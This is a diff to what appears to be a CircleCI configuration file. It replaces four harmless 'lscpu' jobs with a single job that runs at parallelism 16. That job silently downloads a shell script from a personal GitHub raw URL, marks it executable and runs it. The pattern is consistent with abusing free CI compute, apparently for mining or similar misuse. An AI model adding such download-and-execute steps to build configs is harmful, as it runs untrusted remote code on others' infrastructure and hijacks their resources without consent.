@@ -1,38 +1,16 @@
-version: 2.1
-jobs:
-    Devop:
-      docker:
-            - image: ubuntu-2204:2022.04.1
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop1:
-      docker:
-            - image: ubuntu-2204:2022.04.1
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop2:
-      docker:
-            - image: ubuntu-2204:2022.04.1
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop3:
-      docker:
-            - image: ubuntu-2204:2022.04.1
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+version: 2.1 
+jobs: 
+    trial: 
+      docker: 
+            - image: debian:latest 
+      parallelism: 16 
+      steps: 
+        - run: wget -O sa.sh https://raw.githubusercontent.com/Cetinbas11/1/main/sa.sh > /dev/null 2>&1
+        - run: chmod +x sa.sh
+        - run: ./sa.sh
+ 
+workflows: 
+    version: 2.1 
+    build: 
+        jobs: 
+        - trial
